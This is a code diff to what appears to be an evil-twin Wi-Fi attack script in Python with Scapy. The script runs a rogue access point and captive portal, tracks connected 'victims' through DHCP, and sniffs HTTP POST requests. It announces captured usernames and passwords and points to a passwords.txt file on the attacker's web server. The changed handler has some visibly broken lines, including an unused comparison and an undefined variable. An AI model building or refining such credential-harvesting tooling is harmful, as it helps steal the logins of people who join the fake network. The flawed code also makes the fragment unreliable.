@@ -322,8 +322,6 @@ def dhcp_handler(pkt):
         connected_stations[pkt.getlayer(Ether).dst] = '1'
         print("[+]", pkt.getlayer(Ether).dst, " has connected to our access point")
 
-
-def post_handler(pkt):
     if pkt.haslayer(HTTPRequest):
         if pkt.haslayer(Ether):
             pkt.getlayer(Ether).dst == victim
@@ -332,11 +330,11 @@ def post_handler(pkt):
             if packet.find('POST'):
                 print("[+] ", pkt.getlayer(Ether).src, " has submitted his username and password "
                                                        "check /var/www/html/captiveportal/passwords.txt")
-                return True
+
 
 
 def sniff_dhcp(iface):
-    sniff(iface=iface, filter='udp and (port 67 or port 68)', prn=dhcp_handler)
+    sniff(iface=iface, filter='http or (udp and (port 67 or port 68))', prn=dhcp_handler)
 
 
 def sig_handler(signum, frame):
